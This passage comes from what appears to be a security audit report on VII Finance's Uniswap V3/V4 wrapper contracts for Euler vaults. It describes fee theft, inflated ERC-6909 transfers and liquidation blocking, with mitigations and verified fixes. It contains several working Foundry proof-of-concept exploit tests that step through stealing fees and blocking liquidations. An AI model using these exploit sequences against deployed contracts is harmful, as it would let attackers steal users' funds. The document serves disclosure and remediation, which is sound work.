    // @audit-issue => but transfer reverts due to insufficient ERC-6909 balance of tokenId1
    vm.expectRevert(
        abi.encodeWithSelector(
            bytes4(keccak256("ERC6909InsufficientBalance(address,uint256,uint256,uint256)")),
            attacker,
            wrapper.balanceOf(liquidator, tokenId1),
            wrapper.totalSupply(tokenId1),
            tokenId1
        )
    );
    eVault.liquidate(attacker, address(wrapper), maxRepay, 0);
}
```

* This second PoC uses the fee theft and transfer miscalculation:

```solidity
function test_blockLiquidationsPoC_transferInflation() public {
    address attacker = makeAddr("attacker");
    address accomplice = makeAddr("accomplice");

    LiquidityParams memory params = LiquidityParams({
        tickLower: TickMath.MIN_TICK + 1,
        tickUpper: TickMath.MAX_TICK - 1,
        liquidityDelta: -19999
    });

    (uint256 tokenId1,,) = boundLiquidityParamsAndMint(params);
    (uint256 tokenId2,,) = boundLiquidityParamsAndMint(params);

    startHoax(borrower);

    // 1. attacker wraps tokenId1
    wrapper.underlying().approve(address(wrapper), tokenId1);
    wrapper.wrap(tokenId1, attacker);

    // 2. accomplice wraps tokenId2
    wrapper.underlying().approve(address(wrapper), tokenId2);
    wrapper.wrap(tokenId2, accomplice);

    // 3. swap so that some fees are generated
    swapExactInput(borrower, address(token0), address(token1), 100_000 * unit0);

    // 4. attacker enables tokenId1 as collateral and transfers a small portion to accomplice
    startHoax(attacker);
    wrapper.enableTokenIdAsCollateral(tokenId1);
    wrapper.transfer(accomplice, wrapper.balanceOf(attacker) / 100);

    // 5. accomplice enables tokenId2 as collateral and partially unwraps
    startHoax(accomplice);
    wrapper.enableTokenIdAsCollateral(tokenId2);
    wrapper.unwrap(
        accomplice,
        tokenId1,
        accomplice,
        wrapper.balanceOf(accomplice, tokenId1) / 2,
        bytes("")
    );

    // 6. attacker borrows max debt from eVault
    startHoax(attacker);
    evc.enableCollateral(attacker, address(wrapper));
    evc.enableController(attacker, address(eVault));
    eVault.borrow(type(uint256).max, attacker);

    vm.warp(block.timestamp + eVault.liquidationCoolOffTime());

    (uint256 maxRepay, uint256 yield) = eVault.checkLiquidation(liquidator, attacker, address(wrapper));
    assertEq(maxRepay, 0);
    assertEq(yield, 0);

    // 7. simulate attacker becoming partially liquidatable
    startHoax(IEulerRouter(address(oracle)).governor());
    IEulerRouter(address(oracle)).govSetConfig(
        address(wrapper),
        unitOfAccount,
        address(
            new FixedRateOracle(
                address(wrapper),
                unitOfAccount,
                1
            )
        )
    );

    (maxRepay, yield) = eVault.checkLiquidation(liquidator, attacker, address(wrapper));
    assertTrue(maxRepay > 0);

    // 8. accomplice executes fee theft against attacker
    startHoax(accomplice);
    wrapper.unwrap(
        accomplice,
        tokenId2,
        accomplice,
        wrapper.FULL_AMOUNT(),
        bytes("")
    );
    wrapper.unwrap(
        accomplice,
        tokenId2,
        borrower
    );
    startHoax(borrower);
    wrapper.underlying().approve(address(mintPositionHelper), tokenId2);
    increasePosition(poolKey, tokenId2, 1000, type(uint96).max, type(uint96).max, borrower);
    wrapper.underlying().approve(address(wrapper), tokenId2);
    wrapper.wrap(tokenId2, accomplice);
    startHoax(accomplice);
    wrapper.enableTokenIdAsCollateral(tokenId2);
    wrapper.unwrap(
        accomplice,
        tokenId2,
        accomplice,
        wrapper.FULL_AMOUNT() * 99 / 100,
        bytes("")
    );

    // 9. liquidator attempts to liquidate attacker
    startHoax(liquidator);
    evc.enableCollateral(liquidator, address(wrapper));
    evc.enableController(liquidator, address(eVault));
    wrapper.enableTokenIdAsCollateral(tokenId1);

    // full liquidation reverts due to transfer inflation issue
    vm.expectRevert(
        abi.encodeWithSelector(
            bytes4(keccak256("ERC6909InsufficientBalance(address,uint256,uint256,uint256)")),
            attacker,
            wrapper.balanceOf(attacker, tokenId1),
            wrapper.totalSupply(tokenId1),
            tokenId1
        )
    );
    eVault.liquidate(attacker, address(wrapper), maxRepay, 0);

    // 10. at most 1% of the partially liquidated position can be unwrapped
    eVault.liquidate(attacker, address(wrapper), maxRepay / 10, 0);
    uint256 partialBalance = wrapper.balanceOf(liquidator, tokenId1) / 10;

    vm.expectRevert(
        abi.encodeWithSelector(
            CustomRevert.WrappedError.selector,
            liquidator,
            bytes4(0),
            bytes(""),
            abi.encodePacked(bytes4(keccak256("NativeTransferFailed()")))
        )
    );
    wrapper.unwrap(
        liquidator,
        tokenId1,
        liquidator,
        partialBalance,
        bytes("")
    );
}
```

* This third PoC demonstrates that it is still possible to cause losses to the liquidator using fee theft even after the transfer issue is fixed (apply the recommended mitigation diff to observe this test passing):

```solidity
function test_blockLiquidationsPoC_feeTheft() public {
    address attacker = makeAddr("attacker");
    address accomplice = makeAddr("accomplice");

    LiquidityParams memory params = LiquidityParams({
        tickLower: TickMath.MIN_TICK + 1,
        tickUpper: TickMath.MAX_TICK - 1,
        liquidityDelta: -19999
    });

    (uint256 tokenId1,,) = boundLiquidityParamsAndMint(params);
    (uint256 tokenId2,,) = boundLiquidityParamsAndMint(params);

    startHoax(borrower);

    // 1. attacker wraps tokenId1
    wrapper.underlying().approve(address(wrapper), tokenId1);
    wrapper.wrap(tokenId1, attacker);

    // 2. accomplice wraps tokenId2
    wrapper.underlying().approve(address(wrapper), tokenId2);
    wrapper.wrap(tokenId2, accomplice);

    // 3. swap so that some fees are generated
    swapExactInput(borrower, address(token0), address(token1), 100_000 * unit0);

    // 4. attacker enables tokenId1 as collateral and transfers a small portion to accomplice
    startHoax(attacker);
    wrapper.enableTokenIdAsCollateral(tokenId1);
    wrapper.transfer(accomplice, wrapper.balanceOf(attacker) / 100);

    // 5. accomplice enables tokenId2 as collateral and partially unwraps
    startHoax(accomplice);
    wrapper.enableTokenIdAsCollateral(tokenId2);
    wrapper.unwrap(
        accomplice,
        tokenId1,
        accomplice,
        wrapper.balanceOf(accomplice, tokenId1) / 2,
        bytes("")
    );

    // 6. attacker borrows max debt from eVault
    startHoax(attacker);
    evc.enableCollateral(attacker, address(wrapper));
    evc.enableController(attacker, address(eVault));
    eVault.borrow(type(uint256).max, attacker);

    vm.warp(block.timestamp + eVault.liquidationCoolOffTime());

    (uint256 maxRepay, uint256 yield) = eVault.checkLiquidation(liquidator, attacker, address(wrapper));
    assertEq(maxRepay, 0);
    assertEq(yield, 0);

    // 7. simulate attacker becoming partially liquidatable
    startHoax(IEulerRouter(address(oracle)).governor());
    IEulerRouter(address(oracle)).govSetConfig(
        address(wrapper),
        unitOfAccount,
        address(
            new FixedRateOracle(
                address(wrapper),
                unitOfAccount,
                1
            )
        )
    );

    (maxRepay, yield) = eVault.checkLiquidation(liquidator, attacker, address(wrapper));
    assertTrue(maxRepay > 0);

    // 8. accomplice executes fee theft against attacker
    startHoax(accomplice);
    wrapper.unwrap(
        accomplice,
        tokenId2,
        accomplice,
        wrapper.FULL_AMOUNT(),
        bytes("")
    );
    wrapper.unwrap(
        accomplice,
        tokenId2,
        borrower
    );
    startHoax(borrower);
    wrapper.underlying().approve(address(mintPositionHelper), tokenId2);
    increasePosition(poolKey, tokenId2, 1000, type(uint96).max, type(uint96).max, borrower);
    wrapper.underlying().approve(address(wrapper), tokenId2);
    wrapper.wrap(tokenId2, accomplice);
    startHoax(accomplice);
    wrapper.enableTokenIdAsCollateral(tokenId2);
    wrapper.unwrap(
        accomplice,
        tokenId2,
        accomplice,
        wrapper.FULL_AMOUNT() * 99 / 100,
        bytes("")
    );

    // 9. liquidator fully liquidates attacker
    startHoax(liquidator);
    evc.enableCollateral(liquidator, address(wrapper));
    evc.enableController(liquidator, address(eVault));
    wrapper.enableTokenIdAsCollateral(tokenId1);
    eVault.liquidate(attacker, address(wrapper), maxRepay, 0);

    // 10. liquidator repays the debt
    deal(token1, liquidator, 1_000_000_000 * unit1);
    IERC20(token1).approve(address(eVault), type(uint256).max);
    eVault.repay(type(uint256).max, liquidator);
    evc.disableCollateral(liquidator, address(wrapper));
    eVault.disableController();

    // 11. attempting to unwrap even 1% of the position fails
    uint256 balanceToUnwrap = wrapper.balanceOf(liquidator, tokenId1) / 100;

    vm.expectRevert(
        abi.encodeWithSelector(
            CustomRevert.WrappedError.selector,
            liquidator,
            bytes4(0),
            bytes(""),
            abi.encodePacked(bytes4(keccak256("NativeTransferFailed()")))
        )
    );
    wrapper.unwrap(
        liquidator,
        tokenId1,
        liquidator,
        balanceToUnwrap,
        bytes("")
    );

    // 12. full unwrap is blocked by accomplice's non-zero balance
    vm.expectRevert(
        abi.encodeWithSelector(
            bytes4(keccak256("ERC6909InsufficientBalance(address,uint256,uint256,uint256)")),
            liquidator,
            wrapper.balanceOf(liquidator, tokenId1),
            wrapper.totalSupply(tokenId1),
            tokenId1
        )
    );
    wrapper.unwrap(
        liquidator,
        tokenId1,
        liquidator
    );
}
```

**Recommended Mitigation:** To mitigate this issue, the recommendations for all other issues should be applied:
* Decrement the `tokensOwed` state for a given ERC-6909 `tokenId` once the corresponding fees have been have been collected.
* Account for only the violator's `tokenId` balance when performing the `normalizedToFull()` calculation.
* Consider preventing collateral from being enabled when the sender does not hold any ERC-6909 balance of the `tokenId`.

**VII Finance:** Fixed in commits [8c6b6cc](https://github.com/kankodu/vii-finance-smart-contracts/commit/8c6b6cca4ed65b22053dc7ffaa0b77d06a160caf) and [b7549f2](https://github.com/kankodu/vii-finance-smart-contracts/commit/b7549f2700af133ce98a4d6f19e43c857b5ea78a).

**Cyfrin:** Verified. The fee theft and inflated ERC-6909 transfers are no longer valid attack vectors. It is still possible to enable collateral without holding any ERC-6909 balance, but with the other mitigations applied this simply results in a zero value transfer as formally verified by the following Halmos test:

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity 0.8.26;

import {Math} from "lib/openzeppelin-contracts/contracts/utils/math/Math.sol";
import {Test} from "forge-std/Test.sol";

contract MathTest is Test {
    // halmos --function test_mulDivPoC
    function test_mulDivPoC(uint256 amount, uint256 value) public {
        vm.assume(value != 0);
        assertEq(Math.mulDiv(amount, 0, value, Math.Rounding.Ceil), 0);
    }
}
```

\clearpage
## High Risk


### Fees can be stolen from partially unwrapped `UniswapV4Wrapper` positions

**Description:** `ERC721WrapperBase` exposes two overloads of the `unwrap()` function to perform full and partial unwrap of the ERC-6909 position for a given `tokenId`:

```solidity
function unwrap(address from, uint256 tokenId, address to) external callThroughEVC {
    _burnFrom(from, tokenId, totalSupply(tokenId));
    underlying.transferFrom(address(this), to, tokenId);
}

function unwrap(address from, uint256 tokenId, address to, uint256 amount, bytes calldata extraData)
    external
    callThroughEVC
{
    _unwrap(to, tokenId, amount, extraData);
    _burnFrom(from, tokenId, amount);
}
```

The full unwrap assumes the caller owns the entire ERC-6909 token supply and will transfer the underlying Uniswap position after burning these tokens. On the other hand, the partial unwrap is used to burn a specified amount of ERC-6909 tokens from the caller and handles proportional distribution of LP fees between all ERC-6909 holders through the virtual `_unwrap()` function.

In Uniswap V3, the LP fee balance is accounted separately from the underlying principal amount such that the pool does not immediately send accrued fees to the user when liquidity is modified but instead increases the `tokensOwed` balance of the position.`UniswapV3Wrapper::_unwrap` calculates the proportion owed to a given ERC-6909 holder based on the owed token accounting managed by the `NonFungiblePositionManager` contract which allows an exact amount to be passed to the `collect()` call:

```solidity
function _unwrap(address to, uint256 tokenId, uint256 amount, bytes calldata extraData) internal override {
    (,,,,,,, uint128 liquidity,,,,) = INonfungiblePositionManager(address(underlying)).positions(tokenId);

    (uint256 amount0, uint256 amount1) =
        _decreaseLiquidity(tokenId, proportionalShare(tokenId, uint256(liquidity), amount).toUint128(), extraData);

    (,,,,,,,,,, uint256 tokensOwed0, uint256 tokensOwed1) =
        INonfungiblePositionManager(address(underlying)).positions(tokenId);

    //amount0 and amount1 is the part of the liquidity
    //token0Owed - amount0 and token1Owed - amount1 are the total fees (the principal is always collected in the same tx). part of the fees needs to be sent to the recipient as well

    INonfungiblePositionManager(address(underlying)).collect(
        INonfungiblePositionManager.CollectParams({
            tokenId: tokenId,
            recipient: to,
            amount0Max: (amount0 + proportionalShare(tokenId, (tokensOwed0 - amount0), amount)).toUint128(),
            amount1Max: (amount1 + proportionalShare(tokenId, (tokensOwed1 - amount1), amount)).toUint128()
        })
    );
}
```

Alternatively, during the modification of liquidity in Uniswap V4 the `PoolManager` transfers the entire balance of earned LP fees directly to the user and requires the delta to be settled in the same transaction. Given that the ERC-6909 tokens corresponding to the underlying Uniswap V4 positions can have multiple holders, it would be incorrect to forward all these fees to the owner who is currently unwrapping their portion. `UniswapV4Wrapper::_unwrap` therefore first accumulates these fees in storage with the `tokensOwed` mapping and utilizes this state for subsequent partial unwraps of other ERC-6909 token holders, distributing only a share of the corresponding token balance to the specified recipient when interacting with their position:

```solidity
function _unwrap(address to, uint256 tokenId, uint256 amount, bytes calldata extraData) internal override {
    PositionState memory positionState = _getPositionState(tokenId);

    (uint256 pendingFees0, uint256 pendingFees1) = _pendingFees(positionState);
    _accumulateFees(tokenId, pendingFees0, pendingFees1);

    uint128 liquidityToRemove = proportionalShare(tokenId, positionState.liquidity, amount).toUint128();
    (uint256 amount0, uint256 amount1) = _principal(positionState, liquidityToRemove);

    _decreaseLiquidity(tokenId, liquidityToRemove, ActionConstants.MSG_SENDER, extraData);

    poolKey.currency0.transfer(to, amount0 + proportionalShare(tokenId, tokensOwed[tokenId].fees0Owed, amount));
    poolKey.currency1.transfer(to, amount1 + proportionalShare(tokenId, tokensOwed[tokenId].fees1Owed, amount));
}
```

In other words, unlike `UniswapV3Wrapper`, the `UniswapV4Wrapper` is expected to hold some non-zero balance of `currency0` and `currency1` for a partially unwrapped ERC-6909 position until all the holders of this `tokenId` have unwrapped. Also note that while the partial unwrap is intended for use following partial liquidations, it is possible to use this overload to perform a full unwrap. The proportional share calculations will be executed to transfer the underlying principal balance plus LP fees to the sole holder, leaving the empty liquidity position in the wrapper contract as documented in a separate issue. Given that the total supply of ERC-6909 tokens will be reduced to zero, `_burnFrom()` can be called by any sender without reverting and so the empty Uniswap V4 position can be recovered by subsequently invoking the full unwrap.

Combined with the fact that the `tokensOwed` state is never decremented, this edge case can be used to manipulate the internal accounting of `UniswapV4Wrapper` by repeatedly wrapping and unwrapping a position that was previously partially unwrapped. Consider the following scenario:

* Alice wraps a Uniswap V4 position.
* Time passes and the position accumulates some fees.
* Alice fully unwraps the position using the partial unwrap overload, causing liquidity and fees to be decreased to zero as described above.
* Alice then fully unwraps to retrieve the underlying position and increases its liquidity once again.
* Alice re-wraps the same Uniswap V4 position and is once again minted the full corresponding ERC-6909 balance.
* Despite fully unwrapping the position, the `tokensOwed` mapping still contains non-zero values in storage corresponding to the fees accumulated by the position from the first time it was wrapped.
* Alice can now re-use this state to siphon tokens out of the `UniswapV4Wrapper`, stealing LP fees that are intended for the holders of other positions that have been partially unwrapped.

To summarize, a partially unwrapped position will have its proportional fees owed to other holders stored in the wrapper, and chaining this with the ability to recover and re-wrap a position that has already been fully unwrapped, the stale `tokensOwned` state can be used to steal the unclaimed fees from holders of other partially unwrapped positions. As demonstrated in the PoC below and detailed in a separate finding, this also causes a DoS for other holders attempting to fully unwrap their partial balance, which could be leveraged to affect liquidations and cause bad debt to accrue in the vault.

**Impact:** Fees can be stolen from ERC-6909 holders for positions that have been partially unwrapped at least once, representing a high impact. The expectation is for a given `tokenId` to have multiple holder only in the case of a partial liquidation, and the issue does not arise for full liquidation in which the liquidator becomes the sole owner; however, in reality there is nothing preventing legitimate users from partially unwrapping their own positions. For example, it is reasonable to assume that a user would partially unwrap to retrieve some liquidity from a large position that still has enough collateral to continue backing any outstanding borrows, causing the LP fee transfer to be triggered, accounted to the wrapper contract and enabling the attack with medium/high likelihood.

**Proof of Concept:** Apply the following patch and execute `forge test --mt test_feeTheftPoC -vvv`:

```diff
---
 .../periphery/UniswapMintPositionHelper.sol   |  52 ++++++
 .../test/uniswap/UniswapV4Wrapper.t.sol       | 163 +++++++++++++++++-
 2 files changed, 214 insertions(+), 1 deletion(-)

diff --git a/vii-finance-smart-contracts/src/uniswap/periphery/UniswapMintPositionHelper.sol b/vii-finance-smart-contracts/src/uniswap/periphery/UniswapMintPositionHelper.sol
index 8888549..68aedf9 100644
--- a/vii-finance-smart-contracts/src/uniswap/periphery/UniswapMintPositionHelper.sol
+++ b/vii-finance-smart-contracts/src/uniswap/periphery/UniswapMintPositionHelper.sol
@@ -124,5 +124,57 @@ contract UniswapMintPositionHelper is EVCUtil {
         positionManager.modifyLiquidities{value: address(this).balance}(abi.encode(actions, params), block.timestamp);
     }

+    function increaseLiquidity(
+        PoolKey calldata poolKey,
+        uint256 tokenId,
+        uint128 liquidityDelta,
+        uint256 amount0Max,
+        uint256 amount1Max,
+        address recipient
+    ) external payable {
+        Currency curr0 = poolKey.currency0;
+        Currency curr1 = poolKey.currency1;
+
+        if (amount0Max > 0) {
+            address t0 = Currency.unwrap(curr0);
+            if (!curr0.isAddressZero()) {
+                IERC20(t0).safeTransferFrom(msg.sender, address(this), amount0Max);
+            } else {
+                // native ETH case
+                require(msg.value >= amount0Max, "Insufficient ETH");
+                weth.deposit{value: amount0Max}();
+            }
+        }
+        if (amount1Max > 0) {
+            address t1 = Currency.unwrap(curr1);
+            IERC20(t1).safeTransferFrom(msg.sender, address(this), amount1Max);
+        }
+
+        if (!curr0.isAddressZero()) {
+            curr0.transfer(address(positionManager), amount0Max);
+        }
+
+        curr1.transfer(address(positionManager), amount1Max);
+
+        bytes memory actions = new bytes(5);
+        actions[0] = bytes1(uint8(Actions.INCREASE_LIQUIDITY));
+        actions[1] = bytes1(uint8(Actions.SETTLE));
+        actions[2] = bytes1(uint8(Actions.SETTLE));
+        actions[3] = bytes1(uint8(Actions.SWEEP));
+        actions[4] = bytes1(uint8(Actions.SWEEP));
+
+        bytes[] memory params = new bytes[](5);
+        params[0] = abi.encode(tokenId, liquidityDelta, amount0Max, amount1Max, bytes(""));
+        params[1] = abi.encode(curr0, ActionConstants.OPEN_DELTA, false);
+        params[2] = abi.encode(curr1, ActionConstants.OPEN_DELTA, false);
+        params[3] = abi.encode(curr0, recipient);
+        params[4] = abi.encode(curr1, recipient);
+
+        positionManager.modifyLiquidities{ value: address(this).balance }(
+            abi.encode(actions, params),
+            block.timestamp
+        );
+    }
+
     receive() external payable {}
 }
diff --git a/vii-finance-smart-contracts/test/uniswap/UniswapV4Wrapper.t.sol b/vii-finance-smart-contracts/test/uniswap/UniswapV4Wrapper.t.sol
index fa6c18b..2fce3ed 100644
--- a/vii-finance-smart-contracts/test/uniswap/UniswapV4Wrapper.t.sol
+++ b/vii-finance-smart-contracts/test/uniswap/UniswapV4Wrapper.t.sol
@@ -125,7 +125,7 @@ contract UniswapV4WrapperTest is Test, UniswapBaseTest {

     TestRouter public router;

-    bool public constant TEST_NATIVE_ETH = true;
+    bool public constant TEST_NATIVE_ETH = false;

     function deployWrapper() internal override returns (ERC721WrapperBase) {
         currency0 = Currency.wrap(address(token0));
@@ -258,6 +258,36 @@ contract UniswapV4WrapperTest is Test, UniswapBaseTest {
         amount0 = token0BalanceBefore - targetPoolKey.currency0.balanceOf(owner);
         amount1 = token1BalanceBefore - targetPoolKey.currency1.balanceOf(owner);
     }
+
+    function increasePosition(
+        PoolKey memory targetPoolKey,
+        uint256 targetTokenId,
+        uint128 liquidity,
+        uint256 amount0Desired,
+        uint256 amount1Desired,
+        address owner
+    ) internal returns (uint256 amount0, uint256 amount1) {
+        deal(address(token0), owner, amount0Desired * 2 + 1);
+        deal(address(token1), owner, amount1Desired * 2 + 1);
+
+        uint256 token0BalanceBefore = targetPoolKey.currency0.balanceOf(owner);
+        uint256 token1BalanceBefore = targetPoolKey.currency1.balanceOf(owner);
+
+        mintPositionHelper.increaseLiquidity{value: targetPoolKey.currency0.isAddressZero() ? amount0Desired * 2 + 1 : 0}(
+            targetPoolKey, targetTokenId, liquidity, amount0Desired, amount1Desired, owner
+        );
+
+        //ensure any unused tokens are returned to the borrower and position manager balance is zero
+        // assertEq(targetPoolKey.currency0.balanceOf(address(positionManager)), 0);
+        assertEq(targetPoolKey.currency1.balanceOf(address(positionManager)), 0);
+
+        //for some reason, there is 1 wei of dust native eth left in the mintPositionHelper contract
+        // assertEq(targetPoolKey.currency0.balanceOf(address(mintPositionHelper)), 0);
+        assertEq(targetPoolKey.currency1.balanceOf(address(mintPositionHelper)), 0);
+
+        amount0 = token0BalanceBefore - targetPoolKey.currency0.balanceOf(owner);
+        amount1 = token1BalanceBefore - targetPoolKey.currency1.balanceOf(owner);
+    }

     function swapExactInput(address swapper, address tokenIn, address tokenOut, uint256 inputAmount)
         internal
@@ -313,6 +343,34 @@ contract UniswapV4WrapperTest is Test, UniswapBaseTest {
             borrower
         );
     }
+
+    function boundLiquidityParamsAndMint(LiquidityParams memory params, address _borrower)
+        internal
+        returns (uint256 tokenIdMinted, uint256 amount0Spent, uint256 amount1Spent)
+    {
+        params.liquidityDelta = bound(params.liquidityDelta, 10e18, 10_000e18);
+        (uint160 sqrtRatioX96,,,) = poolManager.getSlot0(poolId);
+        params = createFuzzyLiquidityParams(params, poolKey.tickSpacing, sqrtRatioX96);
+
+        (uint256 estimatedAmount0Required, uint256 estimatedAmount1Required) = LiquidityAmounts.getAmountsForLiquidity(
+            sqrtRatioX96,
+            TickMath.getSqrtPriceAtTick(params.tickLower),
+            TickMath.getSqrtPriceAtTick(params.tickUpper),
+            uint128(uint256(params.liquidityDelta))
+        );
+
+        startHoax(_borrower);
+
+        (tokenIdMinted, amount0Spent, amount1Spent) = mintPosition(
+            poolKey,
+            params.tickLower,
+            params.tickUpper,
+            estimatedAmount0Required,
+            estimatedAmount1Required,
+            uint256(params.liquidityDelta),
+            _borrower
+        );
+    }

     function testGetSqrtRatioX96() public view {
         uint256 fixedDecimals = 10 ** 18;
@@ -418,6 +476,109 @@ contract UniswapV4WrapperTest is Test, UniswapBaseTest {
         assertApproxEqAbs(poolKey.currency1.balanceOf(borrower), amount1BalanceBefore + amount1Spent, 1);
     }

+    function test_feeTheftPoC() public {
+       int256 liquidityDelta = -19999;
+       uint256 swapAmount = 100_000 * unit0;
+
+       LiquidityParams memory params = LiquidityParams({
+           tickLower: TickMath.MIN_TICK + 1,
+           tickUpper: TickMath.MAX_TICK - 1,
+           liquidityDelta: liquidityDelta
+       });
+
+       // 1. create position on behalf of borrower
+       (uint256 tokenId1,,) = boundLiquidityParamsAndMint(params);
+
+       address attacker = makeAddr("attacker");
+       deal(token0, attacker, 100 * unit0);
+       deal(token1, attacker, 100 * unit1);
+       startHoax(attacker);
+       SafeERC20.forceApprove(IERC20(token0), address(router), type(uint256).max);
+       SafeERC20.forceApprove(IERC20(token1), address(router), type(uint256).max);
+       SafeERC20.forceApprove(IERC20(token0), address(mintPositionHelper), type(uint256).max);
+       SafeERC20.forceApprove(IERC20(token1), address(mintPositionHelper), type(uint256).max);
+
+       // 2. create position on behalf of attacker
+       (uint256 tokenId2,,) = boundLiquidityParamsAndMint(params, attacker);
+
+       // 3. wrap and enable tokenId1 for borrower
+       startHoax(borrower);
+       wrapper.underlying().approve(address(wrapper), tokenId1);
+       wrapper.wrap(tokenId1, borrower);
+       wrapper.enableTokenIdAsCollateral(tokenId1);
+
+       // 4. wrap and enable tokenId2 for attacker
+       startHoax(attacker);
+       wrapper.underlying().approve(address(wrapper), tokenId2);
+       wrapper.wrap(tokenId2, attacker);
+       wrapper.enableTokenIdAsCollateral(tokenId2);
+
+       // 5. swap so that some fees are generated for tokenId1 and tokenId2
+       swapExactInput(borrower, address(token0), address(token1), swapAmount);
+
+       (uint256 expectedFees0Position1, uint256 expectedFees1Position1) =
+           MockUniswapV4Wrapper(payable(address(wrapper))).pendingFees(tokenId1);
+
+       (uint256 expectedFees0Position2, uint256 expectedFees1Position2) =
+           MockUniswapV4Wrapper(payable(address(wrapper))).pendingFees(tokenId2);
+
+       console.log("Expected Fees Position 1: %s, %s", expectedFees0Position1, expectedFees1Position1);
+       console.log("Expected Fees Position 2: %s, %s", expectedFees0Position2, expectedFees1Position2);
+
+       // 6. unwrap 10% of tokenId1 for borrower which causes fees to be transferred to wrapper
+       startHoax(borrower);
+       wrapper.unwrap(
+           borrower,
+           tokenId1,
+           borrower,
+           wrapper.balanceOf(borrower, tokenId1) / 10,
+           bytes("")
+       );
+
+       console.log("Wrapper balance of currency0: %s", currency0.balanceOf(address(wrapper)));
+       console.log("Wrapper balance of currency1: %s", currency1.balanceOf(address(wrapper)));
+
+       // 7. attacker fully unwraps tokenId2 through partial unwrap
+       startHoax(attacker);
+       wrapper.unwrap(
+           attacker,
+           tokenId2,
+           attacker,
+           wrapper.FULL_AMOUNT(),
+           bytes("")
+       );
+
+       console.log("Wrapper balance of currency0: %s", currency0.balanceOf(address(wrapper)));
+       console.log("Wrapper balance of currency1: %s", currency1.balanceOf(address(wrapper)));
+
+       // 8. attacker recovers tokenId2 position
+       wrapper.unwrap(
+           attacker,
+           tokenId2,
+           attacker
+       );
+
+       // 9. attacker increases liquidity for tokenId2
+       IERC721(wrapper.underlying()).approve(address(mintPositionHelper), tokenId2);
+       increasePosition(poolKey, tokenId2, 1000, type(uint96).max, type(uint96).max, attacker);
+
+       // 10. attacker wraps tokenId2 again
+       wrapper.underlying().approve(address(wrapper), tokenId2);
+       wrapper.wrap(tokenId2, attacker);
+
+       // 11. attacker steals borrower's fees by partially unwrapping tokenId2 again
+       wrapper.unwrap(
+           attacker,
+           tokenId2,
+           attacker,
+           wrapper.FULL_AMOUNT() * 9 / 10,
+           bytes("")
+       );
+
+       console.log("Wrapper balance of currency0: %s", currency0.balanceOf(address(wrapper)));
+       console.log("Wrapper balance of currency1: %s", currency1.balanceOf(address(wrapper)));
+
+       // 12. borrower tries to unwrap a further 10% of tokenId1 but it reverts because the owed fees were stolen
+       // startHoax(borrower);
+       // wrapper.unwrap(
+       //     borrower,
+       //     tokenId1,
+       //     borrower,
+       //     wrapper.FULL_AMOUNT() / 10,
+       //     bytes("")
+       // );
+    }
+
     function testFuzzFeeMath(int256 liquidityDelta, uint256 swapAmount) public {
         LiquidityParams memory params = LiquidityParams({
             tickLower: TickMath.MIN_TICK + 1,
--
2.40.0

```

**Recommended Mitigation:** Decrement the `tokensOwed` state for a given ERC-6909 `tokenId` once the corresponding fees have been  have been collected:

```diff
function _unwrap(address to, uint256 tokenId, uint256 amount, bytes calldata extraData) internal override {
        PositionState memory positionState = _getPositionState(tokenId);

        ...

+       uint256 proportionalFee0 =  proportionalShare(tokenId, tokensOwed[tokenId].fees0Owed, amount);
+       uint256 proportionalFee1 =  proportionalShare(tokenId, tokensOwed[tokenId].fees1Owed, amount);
+       tokensOwed[tokenId].fees0Owed -= proportionalFee0;
+       tokensOwed[tokenId].fees1Owed -= proportionalFee1;
-       poolKey.currency0.transfer(to, amount0 + proportionalShare(tokenId, tokensOwed[tokenId].fees0Owed, amount));
-       poolKey.currency1.transfer(to, amount1 + proportionalShare(tokenId, tokensOwed[tokenId].fees1Owed, amount));
+       poolKey.currency0.transfer(to, amount0 + proportionalFee0);
+       poolKey.currency1.transfer(to, amount1 + proportionalFee1);
    }
```

**VII Finance:** Fixed in commit [8c6b6cc](https://github.com/kankodu/vii-finance-smart-contracts/commit/8c6b6cca4ed65b22053dc7ffaa0b77d06a160caf).

**Cyfrin:** Verified. The `tokensOwed` state is now decremented following partial unwrap. Note that to strictly conform to the Checks-Effects-Interactions pattern this should occur before the external transfer calls (modified in commit [88c9eec](https://github.com/kankodu/vii-finance-smart-contracts/commit/88c9eec6af4db1aaf7ddbd6d5fdd8a0cc0b65d93)).


### More value can be extracted by liquidations than expected due to incorrect transfer calculations when the violator does not own the total ERC-6909 supply for each `tokenId` enabled as collateral

**Description:** Given that the `UniswapV3Wrapper` and `UniswapV4Wrapper` contracts are not typical EVK vault collateral, it is necessary to have some method for calculating how much of the claim on the underlying collateral needs to be transferred from sender to receiver when a share transfer is execution. In the context of liquidation, this transfer is made from the violator to liquidator; however, note that it is also necessary to implement this functionality for transfers in the usual context.

This is achieved by `ERC721WrapperBase::transfer` which allows the caller to specify the amount to transfer in terms of the underlying collateral value:

```solidity
/// @notice For regular EVK vaults, it transfers the specified amount of vault shares from the sender to the receiver
/// @dev For ERC721WrapperBase, transfers a proportional amount of ERC6909 tokens (calculated as totalSupply(tokenId) * amount / balanceOf(sender)) for each enabled tokenId from the sender to the receiver.
/// @dev no need to check if sender is being liquidated, sender can choose to do this at any time
/// @dev When calculating how many ERC6909 tokens to transfer, rounding is performed in favor of the sender (typically the violator).
/// @dev This means that the sender may end up with a slightly larger amount of ERC6909 tokens than expected, as the rounding is done in their favor.
function transfer(address to, uint256 amount) external callThroughEVC returns (bool) {
    address sender = _msgSender();
    uint256 currentBalance = balanceOf(sender);

    uint256 totalTokenIds = totalTokenIdsEnabledBy(sender);

    for (uint256 i = 0; i < totalTokenIds; ++i) {
        uint256 tokenId = tokenIdOfOwnerByIndex(sender, i);
        _transfer(sender, to, tokenId, normalizedToFull(tokenId, amount, currentBalance)); //this concludes the liquidation. The liquidator can come back to do whatever they want with the ERC6909 tokens
    }
    return true;
}
```

Here, `balanceOf(sender)` returns the sum value of each `tokenId` in `unitOfAccount` terms which is in turn used by `normalizedToFull()` to calculate the proportional amount of each ERC-6909 token enabled as collateral by the sender that should be transferred. These calculations work as intended when a sender owns the total ERC-6909 token supply for a given `tokenId`; however, this breaks if the sender owns less than 100% of a given `tokenId` and results in the corresponding calculations of ERC-6909 tokens to transfer being larger than they should be. This ultimately leads to the liquidator extracting more value in `unitOfAccount` than requested.

The source of this error is in the `normalizedToFull()` function:

```solidity
function normalizedToFull(uint256 tokenId, uint256 amount, uint256 currentBalance) public view returns (uint256) {
    // @audit => multiplying by the total ERC-6909 supply of the specified tokenId is incorrect
    return Math.mulDiv(amount, totalSupply(tokenId), currentBalance);
}
```

